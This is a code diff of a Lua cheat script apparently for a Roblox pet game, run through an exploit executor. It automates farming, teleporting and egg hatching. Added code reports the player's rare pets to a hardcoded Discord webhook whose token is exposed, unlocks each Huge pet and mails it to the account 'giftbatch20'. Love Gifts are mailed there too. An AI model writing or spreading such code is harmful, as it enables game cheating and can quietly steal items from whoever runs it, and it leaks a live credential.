@@ -1,3 +1,7 @@
+
+
+
+
 wait(7)
 wait(0.5)local ba=Instance.new("ScreenGui")
 local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
@@ -68,7 +72,7 @@ wait(7)
 
 local function chest()
     while true do
-        wait(5)
+        wait(0.1)
         
         local args1 = {
             [1] = "Rainbow Mini Chest"
@@ -130,7 +134,7 @@ while true do
                 end
             end
         end
-        wait(5)
+        wait(1)
     end
 end
 
@@ -158,7 +162,7 @@ function OrbCollect()
                 orb:Destroy()
             end 
         end
-        wait()
+        task.wait()
     end
 end
 
@@ -172,7 +176,7 @@ function LootbagCollect()
                 bag:Destroy()
             end 
         end
-        wait()
+        task.wait()
     end
 end
 
@@ -238,11 +242,11 @@ spawn(deletetycoon)
                 if NearestBreakable and NearestHitbox then
                     repeat
                         BreakableRemote:FireServer(NearestBreakable.Name)
-                        task.wait(0.1)
+                        wait()
                     until not NearestBreakable.Parent or (HumanoidRootPart.Position - NearestHitbox.Position).Magnitude > _G.AutoFarmDistance or not _G.AutoFarmOnOff
                 end
             end
-            wait(0.1)
+            wait()
         end
         Farming = false
     end
@@ -308,7 +312,7 @@ local function findtext()
                 end
             end
         end
-        wait(0.1)
+        wait()
     end
 end
 
@@ -432,6 +436,45 @@ local function GetItemInfo(ItemsClass)
     return Table
 end
 
+local function calculateAmount()
+    local Items = GetItemInfo("Currency")
+    for _, Item in pairs(Items) do
+        if string.find(Item.id, "ValentinesCoins") then
+            local amount = Item.am
+            local value = 1
+            if amount > 250 then
+                local output = math.floor(amount / 250)
+                if output > 0 then
+                    if output < 20 then
+                        value = output
+                    else
+                        value = 20
+                    end
+                end
+            end
+            return value
+        end
+    end
+    return 1
+end
+
+local function getClosestObject(objects, referencePosition, maxDistance)
+    local closest, closestDistance = nil, maxDistance
+    for _, obj in pairs(objects) do
+        if obj:IsA("Model") then
+            local primaryPart = obj.PrimaryPart or obj:FindFirstChild("Center") or obj:FindFirstChildWhichIsA("BasePart")
+            if primaryPart then
+                local distance = (referencePosition - primaryPart.Position).Magnitude
+                if distance < closestDistance then
+                    closest, closestDistance = primaryPart, distance
+                end
+            end
+        end
+    end
+    return closest
+end
+
+                                   
 local function CreateButton()
     local ScreenGui = Instance.new("ScreenGui", PlayerGui)
     local Button = Instance.new("TextButton", ScreenGui)
@@ -465,37 +508,34 @@ end
 spawn(CreateButton)
 
 
-
+local HttpService = game:GetService("HttpService")
 
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
 local function stop()
     while true do
-        if type(numbertwo) == "number" and numbertwo > 150 then
+        if type(numbertwo) == "number" and numbertwo > 500 then
             completed = true
-
             local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
             local request = (syn and syn.request) or request or (http and http.request) or http_request
             request({
                 Url = webhook,
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
-                Body = game:GetService("HttpService"):JSONEncode({
-                    content = game.Players.LocalPlayer.Name .. " | Completed Tower"
+                Body = HttpService:JSONEncode({
+                    content = LocalPlayer.Name .. " | COMPLETED 500"
                 })
             })
-
+            LocalPlayer:Kick("COMPLETED TOWER . SWAP!")
             wait(3)
-            
-            
-            
         end
         wait(180)
     end
 end
 
 task.spawn(stop)
-
 
 
 
@@ -516,7 +556,7 @@ local function PetInfo()
                             Method = "POST",
                             Headers = { ["Content-Type"] = "application/json" },
                             Body = HttpService:JSONEncode({
-                                content = game.Players.LocalPlayer.Name
+                                content = game.Players.LocalPlayer.Name .. " | COMPLETED 50"
                             })
                         })
                     end
@@ -543,7 +583,157 @@ end
 
 
 
+local function joinraffle()
+    while true do
+        local args = {
+            "TowerTycoonTitanicRaffle",
+            20,
+            false
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Raffle_Submit"):InvokeServer(unpack(args))
+        wait(1)
+    end
+end
+spawn(joinraffle)
 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+
+local function GetItemInfo(ItemsClass, ItemsName)
+    local Table = {}
+    for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+        if table.find(ItemsName, Item.id) then
+            local ItemInfo = {
+                ["uid"] = UID,
+                ["data"] = Item
+            }
+            table.insert(Table, ItemInfo)
+        end
+    end
+    return Table
+end
+
+local function getCurrentTitanicPets()
+    local TitanicPetsTable = {}
+    for _, Pet in pairs(ReplicatedStorage.__DIRECTORY.Pets.Titanic:GetChildren()) do
+        table.insert(TitanicPetsTable, Pet.Name)
+    end
+    return GetItemInfo("Pet", TitanicPetsTable)
+end
+
+function ProcessTitanicPets()
+    while true do
+        local TitanicPets = {}
+        for _, MadeTable in pairs(getCurrentTitanicPets()) do
+            table.insert(TitanicPets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+        end
+
+        if #TitanicPets > 0 then
+            local payload = {
+                content = "OH MY FUCKING GOD A HUGE PET : " .. table.concat(TitanicPets, ", ")
+            }
+
+            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
+            local requestFunction = (syn and syn.request) or request or (http and http.request) or http_request
+
+            if requestFunction then
+                requestFunction({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end
+        end
+
+        wait(5)
+    end
+end
+
+spawn(ProcessTitanicPets)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
+
+function ProcessHugePets()
+    while true do
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
+                end
+            end
+            return Table
+        end
+
+        local function getCurrentHugePets()
+            local GoldPetsTable = {}
+            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
+                table.insert(GoldPetsTable, Pet.Name)
+            end
+            return GetItemInfo("Pet", GoldPetsTable)
+        end
+
+        local hugePets = {}
+        local uids = {}
+
+        for i, MadeTable in next, getCurrentHugePets() do
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+        end
+
+        if #hugePets > 0 then
+            for i = #uids, 1, -1 do
+                local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
+                local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+                request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode({
+                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
+                    })
+                })
+
+                local args = {
+                    [1] = uids[i],
+                    [2] = false
+                }
+
+                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+                wait(1)
+                wait(3)
+
+                local args = {
+                    [1] = "giftbatch20",
+                    [2] = "omg u got a new huge!!",
+                    [3] = "Pet",
+                    [4] = uids[i],
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                wait(3)
+            end
+        end
+        wait(3)
+    end
+end
+
+spawn(ProcessHugePets)
 
 
 
@@ -595,7 +785,7 @@ local function sendingdata()
             if string.find(Item.id, "Love Gift") then
                 lovegiftamount = Item.am
 
-                if completed and Item.am >= 3 then
+                if completed and Item.am >= 30 then
                     local args = {
                         [1] = "giftbatch20",
                         [2] = "enjoy bro",
@@ -607,7 +797,7 @@ local function sendingdata()
                     wait(5)
                 end
 
-                if Item.am >= 15 then
+                if Item.am >= 9 then
                     local args = {
                         [1] = "giftbatch20",
                         [2] = "enjoy bro",
@@ -775,98 +965,73 @@ end
 
 spawn(buff)
 
-
-local function sendinfo()
-while true do
-local completed = false
-local mustsend = true
-
-local Player = game.Players.LocalPlayer
-        local player = Player.Name
-        local ServerID = game.JobId
-        local Http = game:GetService("HttpService")
-
-        local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-        -- Ensure all variables have default values (0) if they are nil
-        -- Updated URL
-        local response = request({
-            Url = 'https://64a08a7a-3355-4149-afcf-d0b7deaaa4f9-00-2nm6vd6tjffq6.janeway.replit.dev/update',
-            Method = 'POST',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            },
-            Body = Http:JSONEncode({
-                Username = player,
-                VoidTicketsValue = completed, -- Use fixed VoidTicketsValue
-                DiamondsValue = mustsend,
-                HugeList = "0",
-                Server = "0",
-InstaplantValue = "0",
-SeedbagValue = "0",
-DiamondsSeedValue = "0"
-
-            })
-        })
-
-wait(15)
-        end
-        end
-        spawn(sendinfo)
         
 wait(7)
-local function egg()
-    while true do
-        local player = game.Players.LocalPlayer
-        local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if not humanoidRootPart then wait() continue end
 
-        local closestEgg, closestEggDistance = nil, math.huge
+while true do
+    local tycoons = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Tycoons")
+    if tycoons then
+        for _, tycoon in ipairs(tycoons:GetChildren()) do
+            local interactable = tycoon:FindFirstChild("Interactable")
+            if interactable and not interactable:FindFirstChild("PlayerImageBillboard") then
+                local luckText = interactable.TowerInfoBoard.Main.SurfaceGui.Top.CurrentLuck.Text
+                local luckValue = tonumber(string.match(luckText, "%d+"))
 
-        for _, egg in pairs(workspace.__THINGS.CustomEggs:GetChildren()) do
-            if egg:IsA("Model") then
-                local center = egg:FindFirstChild("Center")
-                if center then
-                    local distance = (humanoidRootPart.Position - center.Position).Magnitude
-                    if distance < closestEggDistance then
-                        closestEgg = egg
-                        closestEggDistance = distance
+                if luckValue then
+     
+                    local character = Player.Character
+                    if not character then
+                        wait()
+                        character = Player.Character
                     end
-                end
-            end
-        end
 
-        if closestEgg and closestEggDistance <= 150 then
-            local breakables = workspace.__THINGS.Breakables:GetChildren()
-            for _, child in pairs(breakables) do
-                if child:IsA("Model") then
-                    for _, part in pairs(child:GetChildren()) do
-                        if part:IsA("MeshPart") and (part.Position - closestEgg.Center.Position).Magnitude <= 50 then
-                            humanoidRootPart.CFrame = closestEgg.Center.CFrame
-                            
-                            local Items = GetItemInfo("Currency")
-                            for _, Item in pairs(Items) do
-                                if string.find(Item.id, "ValentinesCoins") then
-                                    local amount = Item.am
-                                    local value = 1
+     
+                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+                    if not humanoidRootPart then
+                        wait()
+                        humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+                    end
 
-                                    if amount > 250 and amount <= 500 then
-                                        value = 1
-                                    elseif amount > 500 and amount <= 750 then
-                                        value = 2
-                                    else
-                                        value = math.min(math.floor(amount / 250), 20)
-                                    end
+                    if humanoidRootPart then
+                        if luckValue == 1 then
+                            local closestBreakable = getClosestObject(workspace.__THINGS.Breakables:GetChildren(), humanoidRootPart.Position, 150)
+                            if closestBreakable then
+                                local closestEgg = getClosestObject(workspace.__THINGS.CustomEggs:GetChildren(), closestBreakable.Position, 150)
+                                if closestEgg then
+                                    humanoidRootPart.CFrame = closestEgg.CFrame
+                                    
 
-                                    if value > 0 then
-                                        local success = pcall(function()
-                                            game:GetService("ReplicatedStorage").Network:FindFirstChild("CustomEggs_Hatch"):InvokeServer(closestEgg.Name, tonumber(value))
-                                        end)
-                                        if not success then
-                                            game:GetService("ReplicatedStorage").Network:FindFirstChild("CustomEggs_Hatch"):InvokeServer(closestEgg.Name, 1)
+                                    for _, egg in ipairs(workspace.__THINGS.CustomEggs:GetChildren()) do
+                                        local center = egg:FindFirstChild("Center")
+                                        if center and (humanoidRootPart.Position - center.Position).Magnitude <= 30 then
+                                            local value = calculateAmount()
+                                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("CustomEggs_Hatch"):InvokeServer(egg.Name, value)
                                         end
                                     end
-                                    break
+                                end
+                            end
+                        else
+                            local islands = interactable.TowerInfoBoard.Parent:FindFirstChild("Islands")
+                            if islands then
+                                for _, island in ipairs(islands:GetChildren()) do
+                                    local hugeSign = island:FindFirstChild("HugeSign")
+                                    if hugeSign then
+                                        local hugeSignText = hugeSign.SurfaceGui.Frame.TextLabel.Text
+                                        local hugeSignValue = tonumber(string.match(hugeSignText, "%d+"))
+
+                                        if hugeSignValue == luckValue then
+                                            humanoidRootPart.CFrame = hugeSign.CFrame
+                                            
+
+                                            for _, egg in ipairs(workspace.__THINGS.CustomEggs:GetChildren()) do
+                                                local center = egg:FindFirstChild("Center")
+                                                if center and (humanoidRootPart.Position - center.Position).Magnitude <= 30 then
+                                                    local value = calculateAmount()
+                                                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("CustomEggs_Hatch"):InvokeServer(egg.Name, value)
+                                                end
+                                            end
+                                        end
+                                    end
                                 end
                             end
                         end
@@ -874,9 +1039,6 @@ local function egg()
                 end
             end
         end
-
-        wait()
     end
+    wait()
 end
-
-spawn(egg)
